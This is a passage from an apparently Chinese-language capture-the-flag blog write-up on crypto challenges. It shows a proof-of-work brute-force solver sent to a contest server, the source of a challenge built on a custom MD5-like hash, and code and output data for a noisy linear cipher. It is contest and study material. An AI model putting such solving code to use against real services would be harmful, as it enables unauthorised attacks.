class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>,</span><br><span class="line">         <span class="string">&quot;g&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;o&quot;</span>,</span><br><span class="line">         <span class="string">&quot;p&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">yi</span>():</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> list1:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> list1:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> list1:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> list1:</span><br><span class="line">                    flag = <span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;4&#125;&quot;</span>.<span class="built_in">format</span>(a, b, c, d, sha_key)</span><br><span class="line">                    flag_sha = decry(flag)</span><br><span class="line">                    flag1 = flag[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">str</span>(flag_sha) == <span class="built_in">str</span>(sha_data):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;恭喜！&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> <span class="built_in">str</span>(flag1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.send((yi()+<span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.send(<span class="string">&#x27;flag\n&#x27;</span>.encode())</span><br><span class="line">s.send(<span class="string">&#x27;flag\n&#x27;</span>.encode())</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br></pre></td></tr></table></figure><p>做核酸、洗澡、睡觉等事件干扰，下午三点左右方才又来看题。</p><p>想着勇者山峰没什么了，就登陆了传说殿堂</p><p>🤔奇妙啊，一样的题，一样的打法</p><p>发现绝对厉害的都在传说殿堂，相对厉害的全在勇者山峰</p><p>（到比赛结束前，传说殿堂出一道密码就已经是前30了，勇者前90</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220507204308159.png" alt="image-20220507204308159"></p><p>然后就去看了</p><h2 id="TrainPlus"><a href="#TrainPlus" class="headerlink" title="TrainPlus"></a>TrainPlus</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> MD_Train <span class="keyword">import</span> MD00Plus</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">banner = <span class="string">br&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ooooooooooooo                     o8o              ooooooooo.   oooo</span></span><br><span class="line"><span class="string">8&#x27;   888   `8                     `&quot;&#x27;              `888   `Y88. `888</span></span><br><span class="line"><span class="string">     888      oooo d8b  .oooo.   oooo  ooo. .oo.    888   .d88&#x27;  888  oooo  oooo   .oooo.o</span></span><br><span class="line"><span class="string">     888      `888&quot;&quot;8P `P  )88b  `888  `888P&quot;Y88b   888ooo88P&#x27;   888  `888  `888  d88(  &quot;8</span></span><br><span class="line"><span class="string">     888       888      .oP&quot;888   888   888   888   888          888   888   888  `&quot;Y88b.</span></span><br><span class="line"><span class="string">     888       888     d8(  888   888   888   888   888          888   888   888  o.  )88b</span></span><br><span class="line"><span class="string">    o888o     d888b    `Y888&quot;&quot;8o o888o o888o o888o o888o        o888o  `V88V&quot;V8P&#x27; 8&quot;&quot;888P&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line">sec = os.urandom(random.randrange(<span class="number">1</span>,<span class="number">26</span>))</span><br><span class="line">GreatThing = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;SERVER &lt;INPUT&gt;: &#x27;</span></span>):</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        proof = (<span class="string">&#x27;&#x27;</span>.join([random.choice(table)<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])).encode()</span><br><span class="line">        sha = sha256(proof).hexdigest().encode()</span><br><span class="line">        self.send(<span class="string">b&quot;[+] sha256(XXXX+&quot;</span> + proof[<span class="number">4</span>:] + <span class="string">b&quot;) == &quot;</span> + sha )</span><br><span class="line">        XXXX = self.recv(prompt = <span class="string">b&#x27;[+] Plz Tell Me XXXX :&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(XXXX) != <span class="number">4</span> <span class="keyword">or</span> sha256(XXXX + proof[<span class="number">4</span>:]).hexdigest().encode() != sha:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> sha.decode()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">30</span>)</span><br><span class="line">        FirstBlockHash = self.proof_of_work()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> FirstBlockHash:</span><br><span class="line">            self.request.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.send(banner)</span><br><span class="line">        self.send(<span class="string">b&quot;:) My Great Thing:&quot;</span> + GreatThing )</span><br><span class="line">        self.send(<span class="string">b&quot;:) The MD00Plus of my GREATTHING:&quot;</span> + MD00Plus(sec).encode())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">            self.send(<span class="string">b&quot;Please tell me the msg &quot;</span>)</span><br><span class="line">            msg = self.recv()</span><br><span class="line">            self.send(<span class="string">b&quot;Please tell me the hash you can forcast.&quot;</span>)</span><br><span class="line">            msg,Hash = msg.split(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">            msg = <span class="built_in">bytes</span>.fromhex(msg.decode())</span><br><span class="line">            Hash = <span class="built_in">bytes</span>.fromhex(Hash.decode())</span><br><span class="line">            <span class="keyword">if</span> GreatThing <span class="keyword">not</span> <span class="keyword">in</span> msg:</span><br><span class="line">                self.send(<span class="string">b&quot;[!]INVALID!&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> MD00Plus(sec + msg).encode() == Hash:</span><br><span class="line">                self.send(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.send(<span class="string">b&#x27;You Wrong!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10114</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HOST:POST &quot;</span> + HOST+<span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(PORT))</span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MD00Plus</span>(<span class="params">message: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">    h0 = <span class="number">0x114514ab</span></span><br><span class="line">    h1 = <span class="number">0x1919810a</span></span><br><span class="line">    h2 = <span class="number">0xa0189191</span></span><br><span class="line">    h3 = <span class="number">0xba415411</span></span><br><span class="line"></span><br><span class="line">    R = (<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>) * <span class="number">4</span> + (<span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>) * <span class="number">4</span> + (<span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>) * <span class="number">4</span> + (<span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>) * <span class="number">4</span></span><br><span class="line">    K = (<span class="number">0xd76aa478</span>, <span class="number">0xe8c7b756</span>, <span class="number">0x242070db</span>, <span class="number">0xc1bdceee</span>,</span><br><span class="line">         <span class="number">0xf57c0faf</span>, <span class="number">0x4787c62a</span>, <span class="number">0xa8304613</span>, <span class="number">0xfd469501</span>, <span class="number">0x698098d8</span>,</span><br><span class="line">         <span class="number">0x8b44f7af</span>, <span class="number">0xffff5bb1</span>, <span class="number">0x895cd7be</span>, <span class="number">0x6b901122</span>, <span class="number">0xfd987193</span>,</span><br><span class="line">         <span class="number">0xa679438e</span>, <span class="number">0x49b40821</span>, <span class="number">0xf61e2562</span>, <span class="number">0xc040b340</span>, <span class="number">0x265e5a51</span>,</span><br><span class="line">         <span class="number">0xe9b6c7aa</span>, <span class="number">0xd62f105d</span>, <span class="number">0x02441453</span>, <span class="number">0xd8a1e681</span>, <span class="number">0xe7d3fbc8</span>,</span><br><span class="line">         <span class="number">0x21e1cde6</span>, <span class="number">0xc33707d6</span>, <span class="number">0xf4d50d87</span>, <span class="number">0x455a14ed</span>, <span class="number">0xa9e3e905</span>,</span><br><span class="line">         <span class="number">0xfcefa3f8</span>, <span class="number">0x676f02d9</span>, <span class="number">0x8d2a4c8a</span>, <span class="number">0xfffa3942</span>, <span class="number">0x8771f681</span>,</span><br><span class="line">         <span class="number">0x6d9d6122</span>, <span class="number">0xfde5380c</span>, <span class="number">0xa4beea44</span>, <span class="number">0x4bdecfa9</span>, <span class="number">0xf6bb4b60</span>,</span><br><span class="line">         <span class="number">0xbebfbc70</span>, <span class="number">0x289b7ec6</span>, <span class="number">0xeaa127fa</span>, <span class="number">0xd4ef3085</span>, <span class="number">0x04881d05</span>,</span><br><span class="line">         <span class="number">0xd9d4d039</span>, <span class="number">0xe6db99e5</span>, <span class="number">0x1fa27cf8</span>, <span class="number">0xc4ac5665</span>, <span class="number">0xf4292244</span>,</span><br><span class="line">         <span class="number">0x432aff97</span>, <span class="number">0xab9423a7</span>, <span class="number">0xfc93a039</span>, <span class="number">0x655b59c3</span>, <span class="number">0x8f0ccc92</span>,</span><br><span class="line">         <span class="number">0xffeff47d</span>, <span class="number">0x85845dd1</span>, <span class="number">0x6fa87e4f</span>, <span class="number">0xfe2ce6e0</span>, <span class="number">0xa3014314</span>,</span><br><span class="line">         <span class="number">0x4e0811a1</span>, <span class="number">0xf7537e82</span>, <span class="number">0xbd3af235</span>, <span class="number">0x2ad7d2bb</span>, <span class="number">0xeb86d391</span>)</span><br><span class="line"></span><br><span class="line">    F = <span class="keyword">lambda</span> x, y, z: ((x &amp; y) | ((~x) &amp; z))</span><br><span class="line">    G = <span class="keyword">lambda</span> x, y, z: ((x &amp; z) | (y &amp; (~z)))</span><br><span class="line">    H = <span class="keyword">lambda</span> x, y, z: (x ^ y ^ z)</span><br><span class="line">    I = <span class="keyword">lambda</span> x, y, z: (y ^ (x | (~z)))</span><br><span class="line"></span><br><span class="line">    L = <span class="keyword">lambda</span> x, n: ((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    W = <span class="keyword">lambda</span> i4, i3, i2, i1: (i1 &lt;&lt; <span class="number">24</span>) | (i2 &lt;&lt; <span class="number">16</span>) | (i3 &lt;&lt; <span class="number">8</span>) | i4</span><br><span class="line">    reverse = <span class="keyword">lambda</span> x: (x &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0xff000000</span> | (x &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0x00ff0000</span> | \</span><br><span class="line">                        (x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x0000ff00</span> | (x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x000000ff</span></span><br><span class="line"></span><br><span class="line">    ascii_list = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x, message))</span><br><span class="line">    msg_length = <span class="built_in">len</span>(ascii_list) * <span class="number">8</span></span><br><span class="line">    ascii_list.append(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">len</span>(ascii_list) * <span class="number">8</span> + <span class="number">64</span>) % <span class="number">512</span> != <span class="number">0</span>:</span><br><span class="line">        ascii_list.append(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        ascii_list.append((msg_length &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ascii_list) // <span class="number">64</span>):</span><br><span class="line">        a, b, c, d = h0, h1, h2, h3</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= j &lt;= <span class="number">15</span>:</span><br><span class="line">                f = F(b, c, d) &amp; <span class="number">0xffffffff</span></span><br><span class="line">                g = j</span><br><span class="line">            <span class="keyword">elif</span> <span class="number">16</span> &lt;= j &lt;= <span class="number">31</span>:</span><br><span class="line">                f = G(b, c, d) &amp; <span class="number">0xffffffff</span></span><br><span class="line">                g = ((<span class="number">5</span> * j) + <span class="number">1</span>) % <span class="number">16</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="number">32</span> &lt;= j &lt;= <span class="number">47</span>:</span><br><span class="line">                f = H(b, c, d) &amp; <span class="number">0xffffffff</span></span><br><span class="line">                g = ((<span class="number">3</span> * j) + <span class="number">5</span>) % <span class="number">16</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f = I(b, c, d) &amp; <span class="number">0xffffffff</span></span><br><span class="line">                g = (<span class="number">7</span> * j) % <span class="number">16</span></span><br><span class="line">            aa, dd, cc = d, c, b</span><br><span class="line">            s = i * <span class="number">64</span> + g * <span class="number">4</span></span><br><span class="line">            w = W(ascii_list[s], ascii_list[s + <span class="number">1</span>], ascii_list[s + <span class="number">2</span>], ascii_list[s + <span class="number">3</span>])</span><br><span class="line">            bb = (L((a + f + K[j] + w) &amp; <span class="number">0xffffffff</span>, R[j]) + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            a, b, c, d = aa, bb, cc, dd</span><br><span class="line">        h0 = (h0 + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        h1 = (h1 + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        h2 = (h2 + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        h3 = (h3 + d) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    h0, h1, h2, h3 = reverse(h0), reverse(h1), reverse(h2), reverse(h3)</span><br><span class="line">    digest = (h0 &lt;&lt; <span class="number">96</span>) | (h1 &lt;&lt; <span class="number">64</span>) | (h2 &lt;&lt; <span class="number">32</span>) | h3</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(digest)[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>明显感觉到复杂，没什么人出加上自己调试了半天，交互不好，作罢</p><p>看回了传说殿堂第一题</p><h2 id="bob’s-enc"><a href="#bob’s-enc" class="headerlink" title="bob’s enc"></a><strong>bob’s enc</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">prime =  <span class="number">2141</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(flag)</span><br><span class="line">flag = <span class="built_in">map</span>(<span class="built_in">ord</span>,flag)</span><br><span class="line">flag1 = flag[:<span class="number">21</span>]</span><br><span class="line">flag2 = flag[<span class="number">21</span>:]</span><br><span class="line">row = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">msg1,msg2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [(x+y)%prime <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(msg1,msg2)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multi</span>(<span class="params">msg1,msg2</span>):</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> msg1:</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(l,msg2):</span><br><span class="line">            s += (x*y)%prime</span><br><span class="line">            s %= prime</span><br><span class="line">        out.append(s)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genkey</span>(<span class="params">leng</span>):</span></span><br><span class="line">    l = [[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(row):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(leng):</span><br><span class="line">            l[x].append(random.randint(<span class="number">0</span>,<span class="number">511</span>))</span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line">key = genkey(<span class="built_in">len</span>(flag1))</span><br><span class="line"><span class="built_in">print</span> key</span><br><span class="line"></span><br><span class="line">cipher1 = multi(key,flag1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> cipher1</span><br><span class="line"></span><br><span class="line">cipher2 = multi(key,flag2)</span><br><span class="line"></span><br><span class="line">noise = [random.randint(<span class="number">0</span>,<span class="number">6</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line"><span class="built_in">print</span> add(noise,cipher2)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="number">185</span>, <span class="number">96</span>, <span class="number">351</span>, <span class="number">118</span>, <span class="number">421</span>, <span class="number">449</span>, <span class="number">350</span>, <span class="number">349</span>, <span class="number">388</span>, <span class="number">95</span>, <span class="number">341</span>, <span class="number">327</span>, <span class="number">29</span>, <span class="number">156</span>, <span class="number">399</span>, <span class="number">283</span>, <span class="number">292</span>, <span class="number">461</span>, <span class="number">445</span>, <span class="number">120</span>, <span class="number">126</span>], [<span class="number">495</span>, <span class="number">358</span>, <span class="number">192</span>, <span class="number">300</span>, <span class="number">279</span>, <span class="number">277</span>, <span class="number">478</span>, <span class="number">335</span>, <span class="number">231</span>, <span class="number">241</span>, <span class="number">178</span>, <span class="number">314</span>, <span class="number">453</span>, <span class="number">251</span>, <span class="number">133</span>, <span class="number">391</span>, <span class="number">213</span>, <span class="number">132</span>, <span class="number">254</span>, <span class="number">388</span>, <span class="number">46</span>], [<span class="number">428</span>, <span class="number">44</span>, <span class="number">100</span>, <span class="number">483</span>, <span class="number">12</span>, <span class="number">311</span>, <span class="number">57</span>, <span class="number">443</span>, <span class="number">289</span>, <span class="number">90</span>, <span class="number">478</span>, <span class="number">495</span>, <span class="number">399</span>, <span class="number">89</span>, <span class="number">324</span>, <span class="number">275</span>, <span class="number">322</span>, <span class="number">99</span>, <span class="number">343</span>, <span class="number">489</span>, <span class="number">133</span>], [<span class="number">420</span>, <span class="number">358</span>, <span class="number">472</span>, <span class="number">260</span>, <span class="number">267</span>, <span class="number">136</span>, <span class="number">303</span>, <span class="number">491</span>, <span class="number">390</span>, <span class="number">248</span>, <span class="number">430</span>, <span class="number">117</span>, <span class="number">154</span>, <span class="number">244</span>, <span class="number">62</span>, <span class="number">217</span>, <span class="number">204</span>, <span class="number">334</span>, <span class="number">277</span>, <span class="number">231</span>, <span class="number">325</span>], [<span class="number">11</span>, <span class="number">96</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">456</span>, <span class="number">361</span>, <span class="number">292</span>, <span class="number">278</span>, <span class="number">424</span>, <span class="number">237</span>, <span class="number">345</span>, <span class="number">109</span>, <span class="number">475</span>, <span class="number">473</span>, <span class="number">29</span>, <span class="number">250</span>, <span class="number">195</span>, <span class="number">430</span>, <span class="number">114</span>, <span class="number">13</span>, <span class="number">199</span>], [<span class="number">17</span>, <span class="number">91</span>, <span class="number">330</span>, <span class="number">73</span>, <span class="number">384</span>, <span class="number">134</span>, <span class="number">437</span>, <span class="number">161</span>, <span class="number">166</span>, <span class="number">185</span>, <span class="number">499</span>, <span class="number">491</span>, <span class="number">342</span>, <span class="number">129</span>, <span class="number">348</span>, <span class="number">162</span>, <span class="number">478</span>, <span class="number">216</span>, <span class="number">189</span>, <span class="number">311</span>, <span class="number">502</span>], [<span class="number">396</span>, <span class="number">437</span>, <span class="number">98</span>, <span class="number">421</span>, <span class="number">120</span>, <span class="number">443</span>, <span class="number">113</span>, <span class="number">432</span>, <span class="number">9</span>, <span class="number">476</span>, <span class="number">243</span>, <span class="number">122</span>, <span class="number">416</span>, <span class="number">508</span>, <span class="number">287</span>, <span class="number">45</span>, <span class="number">84</span>, <span class="number">322</span>, <span class="number">504</span>, <span class="number">287</span>, <span class="number">251</span>], [<span class="number">187</span>, <span 